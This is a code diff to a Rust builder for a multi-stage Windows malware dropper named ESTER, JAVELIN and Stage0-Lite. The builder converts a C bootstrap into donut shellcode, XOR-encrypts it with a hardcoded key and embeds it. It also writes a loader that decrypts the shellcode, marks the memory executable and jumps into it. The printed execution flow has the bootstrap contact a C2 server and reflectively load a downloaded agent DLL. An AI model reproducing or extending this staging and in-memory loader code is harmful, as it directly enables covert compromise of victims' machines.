@@ -1,8 +1,8 @@
-//! Multi-Stage Builder - Builds the complete ESTER → JAVELIN → Stage0 pipeline
+//! Multi-Stage Builder - Builds the complete ESTER → JAVELIN → Stage0-Lite pipeline
 //!
 //! This module implements the iterative build process:
-//! 1. Compile Stage0 → Convert to shellcode (donut) → Encrypt → Embed in JAVELIN source
-//! 2. Compile JAVELIN (with Stage0) → Convert to shellcode (donut) → Encrypt → Embed in ESTER source
+//! 1. Build Stage0-Lite (C) → donut shellcode → XOR encrypt → stage0_payload.bin for JAVELIN
+//! 2. Compile JAVELIN (include_bytes! stage0_payload.bin) → Convert to shellcode (donut) → Encrypt → Embed in ESTER source
 //! 3. Compile ESTER (with JAVELIN) → Final executable
 //!
 //! Each stage is encrypted with a unique XOR key for security
@@ -97,15 +97,14 @@ pub fn build_staged_system(config: StageConfig) -> Result<PathBuf, Box<dyn std::
     // Ensure output directory exists
     fs::create_dir_all(&config.output_dir)?;
 
-    // Phase 1: Build Stage0
-    println!("[1/3] Building Stage0 (Bootstrap Payload)...");
-    let stage0_binary = build_stage0(&config)?;
-    println!("Stage0 compiled: {} bytes", stage0_binary.len());
+    // Phase 1: Build Stage0-Lite and populate stages/javelin/src/stage0_payload.bin
+    println!("[1/3] Building Stage0-Lite (C/WinHTTP bootstrap)...");
+    build_stage0_lite(&config)?;
+    println!("Stage0-Lite built and embedded in JAVELIN source");
 
-    // Phase 2: Build JAVELIN with embedded Stage0
-    println!("\n[2/3] Building JAVELIN with embedded Stage0...");
-    let stage0_key = generate_random_key(32);
-    let javelin_binary = build_javelin_with_stage0(&config, &stage0_binary, &stage0_key)?;
+    // Phase 2: Build JAVELIN (reads stage0_payload.bin via include_bytes!)
+    println!("\n[2/3] Building JAVELIN with embedded Stage0-Lite...");
+    let javelin_binary = build_javelin_lite(&config)?;
     println!("JAVELIN compiled: {} bytes", javelin_binary.len());
 
     // Phase 3: Build ESTER with embedded JAVELIN
@@ -118,50 +117,60 @@ pub fn build_staged_system(config: StageConfig) -> Result<PathBuf, Box<dyn std::
     println!("\nExecution flow:");
     println!("   1. ester.exe validates environment");
     println!("   2. Decrypts and loads JAVELIN in memory");
-    println!("   3. JAVELIN decrypts and loads Stage0 in memory");
-    println!("   4. Stage0 contacts C2 at {}", config.server_address);
-    println!("   5. Downloads and executes full agent");
+    println!("   3. JAVELIN decrypts and loads Stage0-Lite shellcode in memory");
+    println!("   4. Stage0-Lite contacts C2 at {}", config.server_address);
+    println!("   5. Downloads agent DLL via /api/stage1/agent_dll and loads it reflectively");
 
     Ok(ester_path)
 }
 
-/// Builds Stage0 binary
-fn build_stage0(config: &StageConfig) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
-    // Update Stage0 config with C2 server address
-    update_stage0_config(&config.server_address)?;
+/// Builds Stage0-Lite using the C cross-compiler pipeline
+///
+/// Runs stages/stage0-lite/build.sh which:
+/// 1. Cross-compiles C source with mingw-w64
+/// 2. Converts EXE → shellcode via donut
+/// 3. XOR-encrypts with key "C2R2_JAVELIN_STAGE0_KEY_2026_!!!!"
+/// 4. Writes encrypted payload to stages/javelin/src/stage0_payload.bin
+fn build_stage0_lite(config: &StageConfig) -> Result<(), Box<dyn std::error::Error>> {
+    let (ip, port) = config.server_address.split_once(':')
+        .ok_or("server_address must be in 'host:port' format (e.g. 192.168.1.10:4444)")?;
 
-    // Determine features
-    // In production: --no-default-features to disable 'dev' console window
-    let features = if config.production { "production" } else { "dev" };
+    // Ensure the build script exists
+    let script = Path::new("stages/stage0-lite/build.sh");
+    if !script.exists() {
+        return Err("stages/stage0-lite/build.sh not found. Is the stage0-lite directory present?".into());
+    }
 
-    // Build Stage0
-    let mut args = vec![
-        "build",
-        "--release",
-        "--target", "x86_64-pc-windows-msvc",
-        "--package", "stage0",
-    ];
+    println!("    Invoking stages/stage0-lite/build.sh --ip {} --port {}", ip, port);
+
+    let mut cmd = Command::new("bash");
+    cmd.args(["stages/stage0-lite/build.sh", "--ip", ip, "--port", port]);
     if config.production {
-        args.push("--no-default-features");
+        cmd.arg("--production");
     }
-    args.extend(&["--features", features]);
 
-    let status = Command::new("cargo")
-        .args(&args)
-        .status()?;
-
+    let status = cmd.status()?;
     if !status.success() {
-        return Err("Failed to build Stage0".into());
+        return Err("stages/stage0-lite/build.sh failed".into());
     }
 
-    // Read the compiled binary
-    let binary_path = Path::new("target/x86_64-pc-windows-msvc/release/stage0.exe");
-    let binary = fs::read(binary_path)?;
+    // Verify output
+    let payload_path = Path::new("stages/javelin/src/stage0_payload.bin");
+    if !payload_path.exists() {
+        return Err("stage0_payload.bin not found after build.sh; check the build logs".into());
+    }
+    let size = fs::metadata(payload_path)?.len();
+    println!("    stage0_payload.bin: {} bytes", size);
 
-    Ok(binary)
+    // Ensure loader.rs uses include_bytes! (idempotent write)
+    update_javelin_loader_include_bytes()?;
+
+    Ok(())
 }
 
 /// Updates Stage0 configuration with C2 server address
+/// (Kept for compatibility, no longer used by the main pipeline)
+#[allow(dead_code)]
 fn update_stage0_config(server: &str) -> Result<(), Box<dyn std::error::Error>> {
     let config_content = format!(
         r#"//! Configuration for Stage0
@@ -198,38 +207,15 @@ pub static STAGE0_CONFIG_MARKER: &[u8; 32] = b"C2R2_STAGE0_CONFIG_MARKER___\0\0\
     Ok(())
 }
 
-/// Builds JAVELIN with embedded encrypted Stage0 (converted to shellcode via donut)
-fn build_javelin_with_stage0(
-    config: &StageConfig,
-    stage0_binary: &[u8],
-    key: &[u8],
-) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
-    // CRITICAL: Convert Stage0 EXE to shellcode first!
-    // Raw EXE files cannot be executed via memory transmute - they need donut conversion
-    println!("    Converting Stage0 EXE to shellcode...");
-
-    // Write Stage0 EXE to temp file for donut processing
-    let stage0_exe_path = config.output_dir.join("stage0_temp.exe");
-    let stage0_shellcode_path = config.output_dir.join("stage0.bin");
-    fs::write(&stage0_exe_path, stage0_binary)?;
-
-    // Convert to shellcode using donut
-    let stage0_shellcode = convert_exe_to_shellcode(&stage0_exe_path, &stage0_shellcode_path)?;
-
-    // Clean up temp EXE
-    let _ = fs::remove_file(&stage0_exe_path);
-
-    // Encrypt the SHELLCODE (not the raw EXE!)
-    let encrypted_stage0 = xor_encrypt(&stage0_shellcode, key);
-
-    // Update JAVELIN loader with encrypted payload
-    update_javelin_loader(&encrypted_stage0, key)?;
-
+/// Builds JAVELIN (stage0-lite already embedded in source via include_bytes!)
+///
+/// stage0_payload.bin was written by build_stage0_lite / build.sh.
+/// JAVELIN uses include_bytes!("stage0_payload.bin") - no inline byte array needed.
+fn build_javelin_lite(config: &StageConfig) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     // Determine features
-    // In production: --no-default-features to disable 'dev' console window
     let features = if config.production { "production" } else { "dev" };
 
-    // Build JAVELIN
+    // Build JAVELIN - now uses include_bytes! so no code generation needed
     let mut args = vec![
         "build",
         "--release",
@@ -256,7 +242,83 @@ fn build_javelin_with_stage0(
     Ok(binary)
 }
 
-/// Updates JAVELIN loader configuration with encrypted Stage0
+/// Writes the JAVELIN loader.rs to use include_bytes! for Stage0-Lite
+///
+/// The encrypted shellcode is read at compile time from stage0_payload.bin.
+/// This replaces the old approach of embedding a 6.5 MB byte array literal.
+fn update_javelin_loader_include_bytes() -> Result<(), Box<dyn std::error::Error>> {
+    let loader_content = r#"//! Stage 3 loader - Loads and executes Stage0-Lite (C-based bootstrap payload)
+use crate::crypto::{decrypt_payload, CryptoAlgorithm};
+use crate::memory::{allocate_rw, cleanup_memory, transition_rx};
+use std::error::Error;
+
+// Stage0-lite shellcode, XOR-encrypted at build time by stages/stage0-lite/build.sh
+// Key: "C2R2_JAVELIN_STAGE0_KEY_2026_!!!!"
+// Regenerate with: bash stages/stage0-lite/build.sh --ip <HOST> --port <PORT>
+const ENCRYPTED_STAGE0: &[u8] = include_bytes!("stage0_payload.bin");
+const STAGE0_XOR_KEY: &[u8] = b"C2R2_JAVELIN_STAGE0_KEY_2026_!!!!";
+
+pub fn load_stage3() -> Result<(), Box<dyn Error>> {
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Loading Stage 3 (Stage0-Lite)...");
+
+    if ENCRYPTED_STAGE0.len() <= 1 {
+        return Err("No Stage0 payload embedded (run build.sh first)".into());
+    }
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Decrypting Stage0-Lite ({} bytes)", ENCRYPTED_STAGE0.len());
+
+    let decrypted = decrypt_payload(ENCRYPTED_STAGE0, STAGE0_XOR_KEY, CryptoAlgorithm::Xor)?;
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Allocating {} bytes as RW", decrypted.len());
+
+    let region = allocate_rw(decrypted.len())?;
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Copying payload to memory");
+
+    unsafe {
+        std::ptr::copy_nonoverlapping(
+            decrypted.as_ptr(),
+            region.address(),
+            decrypted.len(),
+        );
+    }
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Transitioning memory to RX");
+
+    transition_rx(&region)?;
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Executing Stage0-Lite shellcode");
+
+    unsafe {
+        let stage0_entry: extern "C" fn() = std::mem::transmute(region.address());
+        stage0_entry();
+    }
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Cleaning up memory");
+
+    cleanup_memory(&region);
+
+    #[cfg(feature = "dev")]
+    println!("[JAVELIN] Stage0-Lite execution complete");
+
+    Ok(())
+}
+"#;
+
+    fs::write("stages/javelin/src/loader.rs", loader_content)?;
+    Ok(())
+}
+
+/// Kept for compatibility: old update_javelin_loader with dynamic byte-array generation
+/// (no longer called by the main pipeline; use update_javelin_loader_include_bytes instead)
+#[allow(dead_code)]
 fn update_javelin_loader(encrypted_payload: &[u8], key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
     let payload_literal = format_byte_array(encrypted_payload);
     let key_literal = format_byte_array(key);
